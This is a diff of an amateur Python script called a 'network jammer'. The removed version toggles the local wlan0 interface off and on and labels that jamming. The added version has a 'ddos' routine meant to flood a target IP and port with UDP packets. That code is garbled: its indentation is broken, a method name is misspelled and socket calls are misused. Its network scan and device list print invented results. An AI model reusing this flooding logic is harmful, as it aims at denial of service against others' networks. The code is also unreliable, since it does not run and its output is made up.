@@ -1,45 +1,72 @@
-#network jammer 
-import threading 
-import datetime
-import subprocess
-wlan0 = subprocess.run(["ifconfig", "wlan0"], capture_output=True, text=True).stdout.strip()
+#Welcome Br're Lapin
+import random 
+import socket
+import time
+userinput = input("Enter command: ")
+Interface = "wlan0"
+self = None
+network_traffic = ["HTTP", "HTTPS", "FTP", "SSH", "DNS", "SMTP", "POP3", "IMAP", "Telnet", "SNMP"]
 
 class Kate:
-    def __init__(self):
-        self.lock = threading.Lock()
-        self.last_run_time = None
-
-    def launch(self):
-        with self.lock:
-            if self.last_run_time is None:
-                print("Greeting br're lapin to Katerupter!")
+    def __init__(self, network, port):
+        self.network = network
+        self.port = port
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        self.sock.bind((self.network, self.port))
+        self.running = True
+    def greet(self):
+        self.running = True
+        print("Welcome Br're Lapin")
+    def scan_networks(self):
+        if userinput == "scan" or userinput == "scan networks":
+            print("Scanning for networks...")
+            time.sleep(2)
+            if Interface == "wlan0":
+                print(f"Found network: {Interface}")
             else:
-                print("welcome back br're lapin to Katerupter!")
-    def networks(self, command):
-        subprocess.run(["ifconfig"])
-        if command in ("search wlan station", "search wlan list", "near networks"):
-            subprocess.run(["iwlist", "wlan0", "scan"])
-            return "Searching for nearby networks..."
-        scan = subprocess.run(["iwlist", "wlan0", "scan"], capture_output=True, text=True)
-        if scan.returncode == 0:
-            return "Nearby networks found " + scan.stdout + "!"
-        return "Kate had a problem trying to find networks."
-
-    def rupture(self, command):
-        subprocess.run(["ifconfig"])
-        if command in ("rupture" + wlan0, "jam" + wlan0):
-            subprocess.run(["ifconfig", "wlan0", "down"])
-            return "Jamming signal from " + wlan0 + "..."
-        down = subprocess.run(["ifconfig", "wlan0", "down"], capture_output=True, text=True)
-        if down.returncode == 0:
-            return "signal jammed from nearby networks!"
-        return "Kate had a problem trying to jam " + wlan0 + ":("
-
-    def unrupture(self, command):
-        if command in ("unrupture" + wlan0, "unjam" + wlan0):
-            subprocess.run(["ifconfig", "wlan0", "up"])
-            return "unjamming " + wlan0 + "..."
-        up = subprocess.run(["ifconfig", "wlan0", "up"], capture_output=True, text=True)
-        if up.returncode == 0:
-            return wlan0 + " is back online! :)"
-        return "Kate had a problem trying to unjam " + wlan0 + ":("
+                print("Kate had trouble finding any networks. Please try again :(")
+    def ddos(self):
+        from socket import socket, AF_INET, SOCK_DGRAM
+    data = socket.rercv(999999999999)
+    PACKET_SIZE = 1024
+    TARGET_IP = self.network
+    TARGET_PORT = self.port
+    sock = socket(socket.AF_INET, socket.SOCK_DGRAM)
+    PACKET_AMMOUNT = 999999999999
+    if userinput == "jam" + Interface + "." or userinput == "ddos" + Interface + ".":
+        print(f"Jamming {Interface}...")
+        time.sleep(2)
+        for i in range(PACKET_AMMOUNT):
+            sock.sendto(data, (TARGET_IP, TARGET_PORT))
+            print(f"Sent packet {i+1}/{PACKET_AMMOUNT} to {TARGET_IP}:{TARGET_PORT}")
+            print (f"Jamming {Interface} complete.")
+    elif userinput == "stop" + Interface + "." or userinput == "stop ddos" + Interface + ".":
+        print(f"Stopping jamming {Interface}...")
+        time.sleep(2)
+        self.running = False
+        print(f"Jamming {Interface} stopped.")
+    elif userinput == "exit" or userinput == "quit":
+        print("Exiting...")
+        time.sleep(2)
+        self.running = False
+        print("Goodbye!")
+    else:
+        print("Invalid command. Please try again.")
+    def analyze_traffic(self):
+        if userinput == "analyze traffic for" + Interface + "." or userinput == "scan" + Interface + ".":
+            print(f"Analyzing traffic for {Interface}...")
+            time.sleep(2)
+            return network_traffic 
+        elif userinput == "show devices" + Interface + "." or userinput == "cdev" + Interface + ".":
+            print(f"Showing devices connected to {Interface}...")
+            time.sleep(2)
+            print(f"Devices connected to {Interface}:")
+            for i in range(10):
+                print(f"  - Device {i+1}")
+        elif userinput == "exit" or userinput == "quit":
+            print("Exiting...")
+            time.sleep(2)
+            self.running = False
+            print("Goodbye!")
+        else:
+            print("Invalid command. Please try again.")
